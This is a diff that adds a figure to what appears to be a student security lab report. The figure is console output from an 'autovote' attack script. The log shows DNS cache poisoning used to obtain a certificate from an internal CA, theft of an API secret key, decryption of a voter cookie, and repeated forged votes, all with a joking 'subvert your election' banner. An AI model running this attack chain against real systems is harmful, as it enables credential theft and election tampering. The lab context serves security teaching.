@@ -229,3 +229,51 @@ Nmap done: 1 IP address (1 host up) scanned in 20.90 seconds
 }
 ```
 *Figure 2: HTTP security information - output by firefox developer tools*
+
+```
+================================================================================
+-----------------------------Welcome to Auto Elect!-----------------------------
+Is democracy too inconvenient? We've got you covered.
+================================================================================
+
+
+
+--------------------Registering interface on secure vlan...---------------------
+Registered.
+
+------------------------------Launching MTLSploit-------------------------------
+2022/11/09 02:51:46 Preparing DNS poisoner
+2022/11/09 02:51:46 Creating pwn0 interface with 10.64.10.2
+2022/11/09 02:51:46 Fetching validation token
+2022/11/09 02:51:46 Serializing DNS packet
+2022/11/09 02:51:46 Serialized DNS response for TXT [1f7b169c846f218ab552fa82fbf86758] id 11807
+2022/11/09 02:51:46 Sending DNS responses to 10.64.10.3:50000
+2022/11/09 02:51:46 Waiting for DNS cache poisoning
+2022/11/09 02:51:47 Validating token with CA
+2022/11/09 02:52:06 Wrote api.internal-crt.pem and api.internal-key.pem
+2022/11/09 02:52:06 Stopped DNS poisoner
+/usr/lib/python3/dist-packages/urllib3/connectionpool.py:999: InsecureRequestWarning: Unverified HTTPS request is being made to host 'keyserver.internal'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
+  warnings.warn(
+I found the API's secret key! It's  E+OOHJEe8ErDLtTjQx1DVJKX8E0NWmRmTBPWzr/1Mso=
+
+
+
+----------------------------Launching Cookie Monster----------------------------
+Got cookie votertoken,FT4OHKF++tHdIlHY1RTNjTMp5hRhPp1qe7sgDR0%3D
+
+Decrypted value: Name=votertoken, value=1
+Entering endless loop, press ctrl+C to exit.
+Voted for gus with sequence number 2
+Voted for gus with sequence number 3
+Voted for gus with sequence number 4
+Voted for gus with sequence number 5
+Voted for gus with sequence number 6
+Voted for gus with sequence number 7
+Voted for gus with sequence number 8
+Voted for gus with sequence number 9
+^C
+
+Thank you for choosing us to subvert your election <3
+student@client:~/hack$
+```
+*Figure 3: Output of the autovote python script*
